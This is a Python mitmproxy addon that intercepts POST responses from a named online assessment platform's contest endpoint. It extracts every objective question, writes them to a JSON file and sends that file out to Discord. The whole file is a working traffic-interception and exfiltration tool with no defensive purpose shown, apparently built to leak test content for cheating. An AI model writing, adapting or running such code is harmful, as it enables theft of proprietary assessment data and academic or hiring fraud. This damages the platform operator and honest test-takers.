"""
Interceptor Addon

Intercepts POST responses from the TakeContest/Proceed endpoint,
extracts objectiveQuestionsData from all sections, saves to file,
and sends to Discord.
"""

import os
import json
from mitmproxy import http, ctx
from addons.discord_helper import send_file_to_discord

# Target endpoint
TARGET_HOST = "lex-iap.infosysapps.com"
TARGET_PATH = "/backend/TakeContest/Proceed"
TARGET_METHOD = "POST"

OUTPUT_DIR = os.path.dirname(os.path.dirname(__file__))
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "assessment_sectionData.json")


class TargetInterceptor:
    """Intercepts TakeContest/Proceed responses and extracts question data."""

    def response(self, flow: http.HTTPFlow) -> None:
        req = flow.request
        resp = flow.response

        if resp is None:
            return
        if req.pretty_host != TARGET_HOST:
            return
        if not req.path.startswith(TARGET_PATH):
            return
        if req.method != TARGET_METHOD:
            return

        try:
            data = json.loads(resp.content.decode("utf-8", errors="replace"))

            section_data = data.get("sectionData")
            if section_data is None:
                keys = list(data.keys()) if isinstance(data, dict) else type(data).__name__
                ctx.log.warn(f"[interceptor] sectionData not found. Keys: {keys}")
                return

            # Flatten objectiveQuestionsData across all sections
            all_questions = []
            for section in section_data:
                all_questions.extend(section.get("objectiveQuestionsData", []))

            if not all_questions:
                ctx.log.warn("[interceptor] No objectiveQuestionsData in any section")
                return

            with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
                json.dump(all_questions, f, indent=2, ensure_ascii=False)

            ctx.log.info(
                f"[interceptor] Saved {len(all_questions)} questions "
                f"from {len(section_data)} section(s) -> {OUTPUT_FILE}"
            )

            send_file_to_discord(OUTPUT_FILE, title="Assessment sectionData")

        except json.JSONDecodeError:
            ctx.log.warn("[interceptor] Response is not valid JSON")

        except Exception as e:
            ctx.log.error(f"[interceptor] Failed to process response: {e}")


addons = [TargetInterceptor()]